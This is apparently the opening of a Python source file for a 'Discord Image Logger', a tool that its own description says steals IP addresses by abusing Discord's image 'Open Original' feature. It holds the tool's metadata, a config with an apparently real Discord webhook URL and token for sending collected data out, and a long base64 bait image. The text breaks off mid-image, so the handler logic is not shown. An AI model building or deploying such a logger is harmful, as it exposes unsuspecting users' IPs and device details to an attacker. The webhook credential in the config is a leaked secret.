# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1112536204882223104/uETtqXMooR_6CfqUNeNiNPx2k-KiGe3ksr9xsyj1iLkz_CaOfDfbB4qcop71OD46pzhP",
    "image": data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAfQAAAH0CAYAAADL1t+KAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAPHRFWHRDb21tZW50AHhyOmQ6REFFeFRvbk5TMjQ6MTIsajo1OTA5MTE1MzIwOTU2ODgzMDM1LHQ6MjMwNjA2MTkhOF5PAAAFNGlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8eDp4bXBtZXRhIHhtbG5zOng9J2Fkb2JlOm5zOm1ldGEvJz4KICAgICAgICA8cmRmOlJERiB4bWxuczpyZGY9J2h0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMnPgoKICAgICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0nJwogICAgICAgIHhtbG5zOmRjPSdodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyc+CiAgICAgICAgPGRjOnRpdGxlPgogICAgICAgIDxyZGY6QWx0PgogICAgICAgIDxyZGY6bGkgeG1sOmxhbmc9J3gtZGVmYXVsdCc+VGVhbCBhbmQgT3JhbmdlIFZpbnRhZ2UgTW9kZXJuIENsZWFuaW5nIEhhbmR5bWFuIERlbGl2ZXJ5IExvZ28gLSAxPC9yZGY6bGk+CiAgICAgICAgPC9yZGY6QWx0PgogICAgICAgIDwvZGM6dGl0bGU+CiAgICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CgogICAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PScnCiAgICAgICAgeG1sbnM6QXR0cmliPSdodHRwOi8vbnMuYXR0cmlidXRpb24uY29tL2Fkcy8xLjAvJz4KICAgICAgICA8QXR0cmliOkFkcz4KICAgICAgICA8cmRmOlNlcT4KICAgICAgICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9J1Jlc291cmNlJz4KICAgICAgICA8QXR0cmliOkNyZWF0ZWQ+MjAyMy0wNi0wNjwvQXR0cmliOkNyZWF0ZWQ+CiAgICAgICAgPEF0dHJpYjpFeHRJZD45NjQ5Nzk2Yy0wYTE4LTQ2ZTItYmIxNS00YTk1OWQ3NTg5Zjk8L0F0dHJpYjpFeHRJZD4KICAgICAgICA8QXR0cmliOkZiSWQ+NTI1MjY1OTE0MTc5NTgwPC9BdHRyaWI6RmJJZD4KICAgICAgICA8QXR0cmliOlRvdWNoVHlwZT4yPC9BdHRyaWI6VG91Y2hUeXBlPgogICAgICAgIDwvcmRmOmxpPgogICAgICAgIDwvcmRmOlNlcT4KICAgICAgICA8L0F0dHJpYjpBZHM+CiAgICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CgogICAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PScnCiAgICAgICAgeG1sbnM6cGRmPSdodHRwOi8vbnMuYWRvYmUuY29tL3BkZi8xLjMvJz4KICAgICAgICA8cGRmOkF1dGhvcj5TYXRpc2ZpY2luZyBGYWN0b3J5PC9wZGY6QXV0aG9yPgogICAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgoKICAgICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0nJwogICAgICAgIHhtbG5zOnhtcD0naHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyc+CiAgICAgICAgPHhtcDpDcmVhdG9yVG9vbD5DYW52YTwveG1wOkNyZWF0b3JUb29sPgogICAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICAgICAgIDwvcmRmOlJERj4KICAgICAgICA8L3g6eG1wbWV0YT7hcnxoAAAvQklEQVR4nOzVsQ2AMADAsNL//+yIuIAe0QER2Rdky/Xc6x0AwK/NrwMAgHOGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AAYYOAAGGDgABhg4AARsAAP//7N15XM3Z/wfwl3QTKpWddoWxk3WQJfuaZSzZRciWjDVbvmMnhmxl340lS9ZhKLKMLckSRoydiiKp2/L7w+gnpT7n062u6/V8PObxmO79vM857mRe9/P5nM85DHQiIiINwEAnIiLSAAx0IiIiDcBAJyIi0gAMdCIiIg3AQCciItIADHQiIiINwEAnIiLSAAx0IiIiDcBAJyIi0gAMdCIiIg3AQCciItIADHQiIiINwEAnIiLSAAx0IiIiDcBAJyIi0gAMdCIiIg3AQCciItIADHQiIiINwEAnIiLSAAx0IiIiDcBAJyIi0gAMdCIiIg3AQCciItIADHQiIiINwEAnIiLSAAx0IiIiDcBAJyIi0gAMdCIiIg3AQCciItIADHQiIiINwEAnIiLSAAx0IiIiDcBAJyIi0gAMdCIiIg3AQCciItIADHQiIiINwEAnIiLSAAx0IiIiDcBAJyIi0gDauT0AIkpr6bKVuHjxb8nH9+vXGy2a22fjiIhI3THQidRQSMhN+B06Kvn4Jk0aZeNoiOh7wEAnou9GcnIyAgPPI+BMIF68eIl8+fLB2toKrVu1gJmZaW4PjyhXMdCJ6Ltw/foNjP11Ei5dvpLmPfcpHhg4oC88PKYgv65uLoyOKPdxUhwRqb1Tp/zRtn2XdMMcAJRKJVZ7r4WDQze8f/8+h0dHpB4Y6ESk1h48CMPAQcPw7t27TI+9cPESXEaMyYFREakfBjoRqbXfZs1HZOQbycfv3++Hv/7yz8YREaknBjoRqa23b6Nw0O+QcN2OnbuyYTRE6o2BTkRq6/r1YMTHK4Xrrly9lg2jIVJvDHQiUltv3ryVVSdyiZ5IU/CxNSJSW4aGhWTVGRkZpfx7cnIyoqMzn1D3WZ48gIGBgax+iXITA52I1FbVqlWgUCigVIpddretUS3l358/f4GfKtaQXKtQKBD+6l+h/ojUAS+5E5HaMjIyRNu2rYTrunXrkg2jIVJvDHQiUmtTJk8QugTepnVLNG/WNBtHRKSeGOhEpNZsbMpgjc9y5M+fP9NjbW2rY9XKpTkwKiL1w0AnIrXXskUz+B3YjWrVqqT7vra2Nvr37w2/A7tRqBAntNGPiZPiiOi7ULNmDZw6eQQBAWfhHxCIFy9eIJ9uPliXKYM2rVvAysoyt4dIlKsY6ET03dDS0kLjxnZo3Ngut4dCpHZ4yZ2IiEgDMNCJiIg0AAOdiIhIAzDQiYiINAADnUhFkpKS8DEuDsnJybk9lAzFxcUjISEh1/qPj1ciKSkp1/rPTUqlEnFx8bk9DNJQnOVOSExMlBVC2tpZ//XJLFjy5s2LPHnyZKmP7PjzBQUFI+BMIC5fuYp//gnDo0f/4t27TxuAaGlpwcBAHyYmJrC0NEfVKpVRt04t1KtXRyWfmVSJiYkIDDyPU6fP4FrQdYSFPcTTp89S1kUvWLAgzM1MYW1TBrVr1YS9fWNU+Km8SvpWKpU4c+YcrgUFIeTmbYTeuYvIyDd4GxWF2NjYlM/I0NAQFhbmqPBTOZQvXw61a9dE+XJlU/03T05OFvoCkJiYCC0trVQ/i8ro91LK76RSqcTZs+cQeO4CgoKCEfbwIZ4+eYbYjx8BfPrdKmxsDFMzE1iXsUK1alVg17A+KlasIDxWos/yRL15rt6nE5TtJkycilWr1wjX7fpjC1o0t5fd79nA82jbrnOGx4xxHYkZ0yfL7iMmJgZVqtVBeHiEUJ2NTRmcO3sKOjqKlNfevXuH9Ru2YMuW7Qi9e094LEWKFEaXzg4YOLAvypcrm+GxzkNGYOcfeyS3vWjhHAxy6p8yTm+fdVi7bhOePn0mNMaaNWvAZdhgdHLokCoUpQq9ew9r127Evn0H8fLVK+F6ADA1NUHzZk3RuVMHNGxYHxs3bsUo119ltZUd1q9dhc6dO6b73qNH/2K191rs2u2LV69eC7dtbW2FXo7d0bdPLxQpUjirQ6UfDC+5E8a6jZK1XeTKVT5Z6ne199pMj9m8ZRtiYmJk97Fl6w7hMAeACePdUsI8ISEB3j7rUK1GPUydNlNWmANAeHgEVnuvRf0G9hjmMhrPnj2X1U5G9u7dj9p17DDzf3OFwxwALl++ioFOw9C8ZXsEB4dIrouKiob7lBlo0NAeq73Xyg5zAHj8+AnWrd+Edh26ool9a4Q9fCi7rZzy9m0UJk6aBttaDbB8hbesMAeA+/cfwGPmHNSo+TPmzffEx7g4FY+UNBkDnVCsWFG4DBssXPfXX/64fv2GrD4fPAjD4cPHMj0uPDwCW7ftlNVHYmIivH3WCdfVqFENXbt0AgCEhT1E23adMW68u6wvBulJSEjAtu1/oGGj5ti9x1dlbbqNnYgBTkPx7PmLLLd3+fJVNG/RDuvWb8r02Fu376Bps9bwWr4a8fFi25xmJjg4RNIa7rnp1Cl/1KvfBCtX+Qhv8/otUVHRmD1nAZrat5H9d4x+PAx0AgCMGD4EJYoXF66Te5bu7bNe8sQsH5/1siZRHTx4GPfvPxCuc588Hnny5MHp0wFo2qwNLly8JNyGFOHhEXAa5IIZHrOzPJFu/oLFWLtuo4pG9snHuDiMcZsAj5lzvnnMvXv/oFOnHrI+Zym6dO4o6/cypyz5fTk6d3XMlqstAHDz5i20adcZ+/f7ZUv7pFkY6AQA0NfXh6vrcOG6PXv3CV/ajYqKFjrrvnvvPg4fOS46NFnzAho3tkMz+ybw9T2A7j36IjLyjXAbohYvWYbJ7tOz1EZERKSKRpOW5+KlmDtvUZrXlUolnAYPw4uXL7OlX21tbYwdOzpb2laFye7TMX3Gb9k+Y//9+/dwGuwCX98D2doPff8Y6JRi4IB+KFPGSqgmPl4pfFl7w8YtiI6OFqqRcr/9S+fOX8T5C38L1QDAVPcJOHL0OJyHjsjR+5crVvpgxcqszUnITnPmLsSevftSvbZh45ZsvRzctYsDypW1ybb2s2KGx2wsX+GdY/0plUoMHTYKly9fzbE+6fvDQKcU+fLpYPy4McJ1mzZvS3lkKzMJCQmS7st+LSDgLK5eDZJ8vJxbAZ07d0SBggXgPGSkrHvBpqYmqFy5IqytraBQKDIv+IqHxyy1vl/qNnYiHj9+kvLz2rWqvcT/JW1tbbi5jcq29rPibOB5LF6yTLhOR0cBKytLVKlSCWZmpsL1H+PiMHjIiCxNEiXNxkCnVLr90vmbe05/S2TkG2zavF3Ssfv2H8TDh4/kDE3yJfT79x/Az++IUNsKhQJj3UZh0CAXoasHlpYWWOI5H//cC0FI8CWcDTiBK5cC8SjsNjasW40qVSpJbutjXBwmu09X24Vp3r6NwoSJUwF8+oxv3wmVXKubLx+6dHbAtKkTMX/eb/CY7o7Ro1zQzL4JjI2N0hyvzmfnW7buEDq+/s91sX3bBvz7MBTXrpzDGf8/ceP637gXGow5s2eieLFiktt68CAMizzFv0zQj4HPoVMax46fQLfufYRqLC0tcPnvM5kunNKiZQdc/FveJDMdHQWCrl5A6dKlMjzu13GT4bNmvVDbAwf0RdGiRTBvvqfkmqZNG2HDOm8UKvTtR/7i4uIxcpSb0DPlu/7Ygt27fYVqcpLfgd2IiIhEvwHOkmtWrvgdjj27pfteQkIC/P3PYvceX+zdux8JiYk4f+4UytpYA4DaPYcuwnX0cEyfNjnDZ/pfvHyJX7r1lvyYoJ6eHoKDLqJwYWNVDZM0BAOd0tXBoRv8/c8I1axdsyLlca/0nDt/Ea3bOGRpXK6uI+Ax3f2b70dERKJKtTp4//695Db19PRw5PA+tG7jILnOwsIcgWdOQE9PL9NjExIS0LJ1R8n3P1s0t4eRkWGWAv3TvuEN0biRHczNTFGgYAGEh0cgJOQmjh0/kaVZ6a1aNkfTpo0wfsIUyTV3bl9DyRIlMj3u6dNnCDgTiJ49fkl5TTTQ7Zs2xtQpE1N+Do+IQNdfekmuVygU+PPYwTSvB567APcpMyS307FjO2zaIO3Wz+PHT1C/oT2ioqRdHZoxfTLGuI6UPBb6MfCSO6Vrivt44ZpVqzKeuCY6sS09mzdnvNDMuvWbhMIcAIY4O8HX94BQneuo4ZLCHPh0P3jyxHGS2z51OgBxWZiQ17BhfZzxPw7fPTswepQLHBzao0Vzezj27IbZszzw94UAeC3zTPdStxTH/zwp/Ez+yZOnJR1XunSpVGEuh5GREapXr5ryT8UKPwm38WX953/8/A4LteE+WfrfIVNTEwxyGiD5+H18jI3SwUCndNWuVRMdO7YTqrl0+QoCAs6m+15Y2EPh+9rpiYiI/OYjbx/j4rBO8FnsokWLYLiLM3b+sVuorkULsSVvmzSxQ9GiRSQdq1Qq8fyFvEfB+vZxhO+e7ahUqeI3j8mbNy/69O6JY0cPwMrKUriPpKQkPHgQJlQzxm083KfMSDWp7nty+06o0FMTZW2shecAdHJoL/nYoKDg7/azpOzDzVnomyZPGofDh48JrX61avVa2Nk1SPO6zxrpC8lkxsdnPQY59U9zX3Lnzt3Cq6SNGumCO6F3hZ+lX7N2o/CmMQUKFJB8bKSM58qb2TfBYs95kjeAKWtjjc0bfdCqTSfJTyl8Jvp5xccr4bV8NVatXovGjRqiQ/u2aNq0EUxNTYTayS2HDh0VOl6ZkICZ/5srVJOYJLaJzOXLV7+bz49yBgOdvql8ubJwdOyGjRu3Sq45cvQ47oTeTbX5SFRUtPDM4IzcvXcfhw4fQ/t2rVNeS05Oxmpvsefhzc3NMHjwAHh5rRIeg+fipcI1It5GRQkdr6OjwIL5s4R3c6tUqSJGDB+COXMXCtXdu/8PShQvLryoTEJCAk6cPIUTJ08BAGrVtEXHju3g2LObWk/yOht4Xuj4sLCHWOT5ezaN5pMbIbfQqVOHbO2Dvi+85E4ZmjDODQULFpR8fFJSUprHyzZt3iZ5so9UX9+PP3b8BG7evCXUxrhfXZFfVxchgnU54f17sWeN27drK+vyOQAMHTJI+Ln58PAIdO/eRVZ/X7p0+QqmTPVA5aq1MWHiVLx+HZ7lNrNDSMjN3B5CGk+e8JI7pcZApwyVLl0KgwdLn6wDADt27E7ZbSohIUHla4wDwJkzgakWmlm5SmyZ14oVK6Q8RhUW9lCVQ1OJj//tmy1VkyZ2svsyNCyEunVrC9e1atlC6Dn7jMTExGDV6jWoWbsBNm3eppI2VSUy8o1aftF48VL+jnakmRjolCnXUcOFLofGxsamhPj+A37ZFpifrwQEBQXj9OkAodrJk8Yhb968AD4tmKJuRBeXEV2y92tWlhbCNUplPLZv3QAbmzJZ6vtLb99GYeSosRjgNBRxcfEqazcr3r59m9tDSNeHmA+5PQRSMwx0ypSRkSFGjRgmVLN+/WbExsbCW+C+dpkyVhg8SPrVAN99B/D06TOsWCm2pvbP9eqgXdtWKT/HxsYK1aujjBa3kcLQsJBwTezHjzAxKY1DfnvRoH69LPX/tb1796Nnr35qsR94rODVkpzyMU49x0W5h4FOkgwZ4iQ0o/blq1cY4zZBaOvRQU79MWzoIMkTu+LjlfCYORu++8R2oXJ3n5DqZ11dXaF6dRQdLTZLPU294Cx34NNyrgBQvFgx7PPdiYkTxkJHR3wN+285efI05s9frLL25Pr851Q3n68wEX3GWe4kSf78+TFurKvQil3bd+ySfKyxsRH69O4BfX19tGnTEgcOHJJUJ7qaWpvWLdOcTRoaFsK//z4WasPDQ/oqaXJMm/4/HBHYMjYs7CHqybgP/tmjR/8K13y5sI5CocCkib+ic+eOmDlzNvwEH/P6lmVeKzDuV/ENg1TJ0NBQuMZ98ng4CDxXLkd+DfgiSqrFQCfJevXqjlWr1+DW7Tsqb7t3r09hDnxauU1qoIvQ1taG++S0K7ZZWJhLXkcbAOLi41LWGc8uBv99FlKdPh3wzbXSMxMbG4vz58W3mjUxLZ3mtXJlbbB1y3rcuHETPmvXw9f3oPBWuV+Kj1fi0qUrsuvl+Hr+QuHCxjA2NkJk5BvJbeTNq5XtvyNEX+Mld5JMW1sbkyaqfpMMhUIB58EDU35uUL8eatW0VXk/3bt1SXcFNdGlQYOCgoUW28kJBw4cwpMnT2XVbti4RXgegbGxUYa7hFWuXBFLlyzE7ZtX4LXME/V/ritrbAAQfEP6ly1VSEhISHPfvHJlsdn8V65I3+qXSFUY6CSkQ4e2qFunlkrb7OTQPs39eWfngd84Wp78urqYMN4t3fdEwyYiIhJHj52QPZZz5y/KusSdkdiPHzFx0lTh2fFPnz7DkiXLhfuzrVFd0kp5enp66NO7Jw4f8sWfxw+iTm3x352XWX08S3BFPwBplrYV/R057X8Gz1+IrVr4pUOHjwqv3kfEQCdhIptOSDHE2SnNa50c2sPc3ExlfQwc2Peb7dWtW1vSTmBfmjlztqzFco4dP4HOXXqiZu0GGD1mnEqD/aDfEbhPmYGkpCRJx79+HY6+/QcLr/YGfNoABgBOnDyF//02V1KftWvVxN4924QXwMnq/vAFBZbc/ezEiVOpfm7TuqVQfUxMDNzdPWSNffacBXDsNQDVbX/GIs/fGewkGQOdhNnZNUDLFs1U0laDBj+jZs0aaV5XKBQYOKCvSvowNCwEtzGjvvm+QqHAL798e9vX9Ny9dx+du/YUWtN8tfda9Oo9ELGxsYiPV2LDhi0qD/blK7zRo2c/3L13P8Pjjh77Ey1adZC8pevX2rVthfh4JaZM8cDCRb/DoXMP3Am9m2mdnp4eatdS/e2UjOjrS9sV70vLvFamzKtITk5GVFQUihQpLNTGnr37MHLUWMmPvcXGxmLESDfMm+8J4NMXrpn/m8tgJ8m4HzrJEhwcgkZNWko+G/yWLZvWon37Num+9/ZtFCpXrZ2lSVUAMHXKRPw6dnSGxzx79hw1bH8WfubY0LAQRo9yQb++vdNdfCc5ORmB5y5gkefv+Osv/2+2o6OjgKNjd7i5joS5uRmch4zI0n7oCoUCjRs1RMOG9WFqUhoFChZAZOQbhIbexYmTp7O0lGkz+ybYs3sbFi9Zhhkes1P12bt3D7i5joSZmWm6tUlJSWhi3xpBQcGy+89M1y6dsHbNilSvVapSS3h3Mi0tLdhYl8Gbt29TVj6Uo6yNNcaOHY3OnTqm+1jfx7g4+Pkdxvz5ixF699432ylatAiGDR0E58EDUyaQEn2JgU6yDRk6Ejt2im07+iUbmzK4eN4/w+dpJ06ahpWrfGT3UapkCVy+dFbSevTTPWZhyRIvWf0oFArUtK0Oc3MzFCxYELGxsXj+4iVCQm4KLRv6OdgjIyJx4KDY/ts5Zd/eHShb1gZ16jVO96xRR0eBjh3ao2tXB9T/uS709fWRmJiI0Lv3sGSJl/AXFV1dXaGlcNML9G7d++DYcfnzHj4zNzeTfTXFwMAAtWvZomTJEtBWaOP9uxg8efIEwTduIiZG+tr9n4PdxWUIH12jVBjoJFtY2EPUrddY9mpe8+f9lu798y89eBCGWnXsZG+9umjhHAxy6i/p2NjYWNg1apHp5ersVriwMX6uVxcH/dQv0Js3a4rdu7bCaZALdu/xzfR4LS0tGBoWQnT0O9n/DcuVs0Fo6LfPXL+WXqDPmbsQc+ctktX/l2rUqIbbt+7k+upx9erWht/BPcK765Fm4z10ks3S0gIDZN7nLlzYGL179cj0OCsrS7T9YplWEWVtrNGvby/Jx+fPnx9rfFYI7S6XHebMnokCBfLn6hjSY2BggAXzZyEg4KykMAc+XWKPjHwjO8yBTxvpZFXbNvJ+h74WHByCSZPSrmWQk/T09LBsqSfDnNJgoFOWuI0ZKWsd8T59HCUH55fPqIuYMMFNeFvQqlUrY4XX4lz7n+VwF2d075b1bUmzw4L5s2BiUhqT3GfkWJ+GhoVQyzbtpElRVapUSncNAlEJCQkoXNgYLsMGZ7ktObS1tbFy+RKVbohDmoOBTllSrFhRDHcZIlSjo6OAs8AmLA3q10PtWjWF+rC1rY4unR2Eaj5zcGgPr2Wewl8GsqqXY3fM+m1GjvYp1bhfXdGje1es9l6Xo3uDjx/nprIrJmPHjFRJO8f/PInZszzgNLCfStoT4bloLjp0aJvj/dL3gYFOWTbcxVnoOe5ODh1QunQpoT6cncX2ZJ8yeYKkhU++pWePX7Bt63oYGGRtFzOp3MaMgtcyT9ljnuI+AUWLFlHxqD5xHT0cU/7b0ObuPen3srPKwaG9Ss+EO3XqIGthm6/99Zc/PsbFwXPR3JTPJbvp6+tj0wYfoVtI9ONhoFOW6enpYcyYEZKPHzpkkHAfDh3bw8LCXNKxTZs2QtOmjYT7+FqL5vb468ThdJ+TV5VSJUtg43pvTJ82CVpa8v86VqlSCfv27hBetCUjOjoKLFwwGx4z/n8jmqVLFsJjxpRs34Gse7cu8F7llaUvZV/LkycPVixfkuUvPu/evcPp0wEAPl252PXHFuGFiUTY2lbH0cO+6NixXbb1QZqBgU4qMaB/X1hbW2V6nJ1dA9SoUU24fZGFZqZMVt1Zk41NGRw9vA9zZs9M9zlzuQoWLIjhLs64eMFfZbtyVapUESeO++GXrp2z3JatbXX8ecwv3f3pXUcPh7//cXTp7KDyuQalSpbAiuVL4L3aC/ny6ai0bQCwtrbC3t3bYWlpkaV2Tp8+k/LvLZrb41zgX3AePFClt2lKlSyBRQvn4M9jB1Vy/580HwOdVEJHR4Hx49JfK/1LmT2mlpH+/Xpnegm8S2cH2NpWl91HehQKBVyGDUbQ1fP438xpKF+urOy2KleuiJkeUxESfAmzZ3mo/JJ+4cLGWOOzHAf370LjxnbC9bVq2mLd2pU4cdwP1apV+eZx5cuVxbq1K3Hl0lmM+9U1y1cGateqCc9Fc3H1yjn0cuyepbYyU6VKJZz+6yiGDR0s/Bx3+XJlsWjhHMyY4Z7qdWNjIyyYPwtXLp3FcBfnDDeuyYiOjgKNG9vBx3s5rgf9jUFO/bnvOUnG59CJZLh+/QYCzgTiytVruH//Hzx+/ATR0e+QlJQE3Xz5oKevB2MjI1haWsDa2goVK1ZAk8Z2KFWqZI6O88GDMBw+chwXLv6Nu6H38O/jJyk7q+nr68PM1ATWNmVQq6YtmjVrgp/Kl5Pd140bNxFwJhDXrwfj3n+fyZs3b1MeWVMoFDA2MkLRYkU/9WtthapVK6N+/XrZesk6I+HhEdi3/yDOnD2HO7dD8ejfx4iNjYW2tjYKFTJA8WLFUP6ncqhcqQJaNLeXfKasVCoRGHgegecu4Pr1GwgLe4inz56nLCCTP39+GOjro1jxoihTxgplrKxQo0Y1NLKrz1XgSDYGOpGKJCcnIyEhIcdnx4tKTExEnjx5snTPXkR8vBJ582p9N2eaiYmJ0NLSUun9+8+SkpKQnJz83XwW9H1hoBMREWkA3kMnIiLSAAx0IiIiDcBAJyIi0gAMdCIiIg3AQCciItIADHQiIiINwEAnIiLSAAx0IiIiDcBAJyIi0gAMdCIiIg3AQCciItIADHQiIiINwEAnIiLSAAx0IiIiDcBAJyIi0gAMdCIiIg3AQCciItIADHQiIiINwEAnIiLSAAx0IiIiDcBAJyIi0gAMdKLvUExMDBITE3N7GESkRhjoRN+hvv0GY+myFbk9DCJSIwx0+uENcBqKU6f8c3sYQj58+IB372JyexhEpEYY6PRDe/06HFevBuFa0HVERr4Rqn316nWqnz/GxSE6OlpWG7du35H1peL9+/c4fOQYzpwJlH0JPizsIQ4ePIwbN24CAEJCbiI5OVly/ec/w4uXL+F36GhKO6Lu3fsHB/2O4NbtO7LqiX50eaLePJf+N5dIg9y+E4q69Rqn/KxQKHAvNBhGRoaZ1p6/8De6dHXEvw/vQFtbGwAwe84C3Am9i00bfCT1/7kN19HDsWfPPsQrlTh2ZD+KFSuaaW3rNg7Q09PDjRs3oZtfF69evYaNTRls37YRpUqWkNQ/AMyZuxDzFyyGmZkpIiIi0a5tK+z8Yw8CTh9H5coVM61PSEiAiVlZOA3siy1bd0BfXx+PHz/B9GmT4DZmlORxrFjpg7nzFuKn8uVwJ/QuWjS3h/dqL+TJk0dyG0Q/Op6h0w/rp/Ll8PhRKCwtLTDTYyoePrglKcwB4EPMB8TExCDhi7PimJgYxLyXfhn8cxuvXr3GxQv+uHblnKQw/+y0fwC8vDwRdPU8goMuIjExERMnTZVc7+9/BvMXLIaPtxeuX7uAWyGX8fDhIyQlJeFj3EdJbSQkJiI2NhbBN24iOOhvhARfwrhfXbHk9+VCZ/lz5i6E11JPHDt6ANeunEeFCuWRlJQkuZ6IGOj0gzMwMICWlhYKFiwAPT29XBnDsKGDZNU5OnZHM/smAIAiRQpj9m8zcPjwMcTGxkqq37ffD23btkLXLp0AfPosFi6YLWssgwb2Q6FCBgCA1q1aICoqGuHhEZLry5W1wWqfdThx8hT09PQwxnUk8ubNK2ssRD8qBjpRLittUlpWnamJSeqfTU2gVCrx5s1bSfXhEREwM03dhpmZqayxfPllSEdHBwCgVCol1+/YvhFlbazh4uKKnypWx6rVa2SNg+hHxkAnksGgkD4A4P279ymvvXv/HoaG0i7Zq8KVK9dS/Xzp8lUUKmSAokWLSKq3tDDHtWvXU10a/7rNnGJsbITFnvNw+9ZVLFowB5MmT8ed0Lu5Mhai7xUDnX54urq6CLl5C/fvP5Bc81P5cihatAgWLFyCx4+fICDgLA4dOoq6dWtl40hTO3zkGGbPWYAnT57ixMlTmDhpKvr07gmFQiGp3tGxO65du45Jk6fj8eMnCDx3AaNcx2XzqNO6du06KlS0xbHjJwAAFStWgI5CIXQPnogY6ETo368X9u7dj9FjpIeZnp4eVq1ciqPH/kSlKrXQ5RdHtGvXGgP695HcRrFiRWFjUwaK/2bJizAyMsLIEUNx8e/LqFi5Jnr07Id27Vpj6tRJktsoX64s1q1bBb9DR1CpSi306euE0aNcYGFhjqJFpJ3lK7S1YW1theLF/38yX+EihWFubgYDA31JbVSvXhXOzgPgPGQESptYo4l9a0yf7o6fypeT/GchIj62RpRlERGRMDDQl3xmrApKpTKlv1evXqNAgfyyJ/UlJSXhxctXKGxsjHz5dFQ5TCFKpRKvX4ejePFinBBHJAMDnYiISAPwkjsREZEGYKATERFpAAY6ERGRBmCgExERaQAGOhERkQZgoBMREWkABjoREZEGYKDTD2/T5m04efK0rNqzgecxxm0CXN3Gw9VtPCa7T8eFi5eE2nj69BmWea2S1b9USUlJ+G3WPLx69Trd92/evIU1azfIavvVq9dwnzJDaDOWL8c1f8FivHv3TnLN06fPsMjz93S3V935xx7cu/eP8DiINAEDnX5oUVHRmOw+A1OnzZS1dviePftw2v8MPsR8wIeYD7gTehdt23XG4SPHJLdx7vwFTJnqIdy3iBcvX2HBwiUYN8E9zXtxcfFwHjoKnouXyWrb22cdvJavxoGDh2SNa9bs+bgeHCK55tz5C5j5v7lY5Lk0zXsbNmxGYOB54XEQaQIGOv3QduzcBUPDQgi9ew8BAWeF65ORjFo1a8B7tRe8V3th7+7t6OXYHUuXrpDeRk6s1fhfJwcOHIKv74FUb82dtwghITdlfaGJj1di69YdsLAwx/oNW2SPS+RDSE4GdHQUmDtvEU6fDhDvk0hDMdDph7Zx0zYMHTIILVs0w/qNMgIpHeXKlcXzFy9V0paqDXLqj4mTpiE8PALAp+1SV670RtcunWS15+d3GImJSVi1cinOnAnEzZu3VDjabytfvhx6OXbH0GGj8ez5ixzpk0jdMdDphxUQcBYPHz5CL8fuGDCgD/z8juDZs+dZajM6Ohq+vgdQo0Y1FY1StZwHD4S5uRkmu09HXFw8RrmOw9Chg1G9elVZ7W3YtBW9evVAvbq1UbdOLXln6TLNm/cbSpYqgcHOw5GQkJBj/RKpKwY6/bA2btqGrl0cYGRkCPumjWFpYY6Nm7YKt7N/vx+srCvCyroibMpWQXhEBKZNmaj6AatA3rxaWOw5F777DqBbjz5ITkrCxIljZbV1+04oAgPPo3+/XgCAfv16Y+cfe4QmuGVFfl1drPVZgdu378Bj5uwc6ZNInYlvxEykAV68fIkDB/1gW6M6BjoNA/DpfvjmLdvx69jRQluh1q5TC0OHOAEAChYogDp1ayO/rm62jFsVKlasANfRI+C5eBmOHPaFbr58strZsGELChYsAI+ZcwAAcXEfER0djR07d2PwoAGqHPI3WVlZYunvi9CnrxNq166VI30SqSueodMPacuWHbCytES1alVRrFhRFCtWFM3smyIqKhp+fkeE2ipZojjatmmFtm1aoXFjO7UO888mjHfDqZNHULtWTVn1MTEx+GPXHrRp3TLl8zM1NUXjxnbYsFH8KkdWtGvbCqNGuWDU6LFqO3eBKCfwDJ1+OImJidi8ZTsmThiLnj1+SfXeh9gPWL9xCzp16pBLo8sZ2traqFKlkuz6Xbt8UaRwYaxc8Tvy5MmT8vq//z5GddufERBwFnZ2DVQxVEmmuk/AtWvX4e9/Jsf6JFI3PEOnH87de/eRlJSUbmgPdhqA27fvSJ5kZVK6NExMTLI0nlIlS6DCT+Wz1EZmDA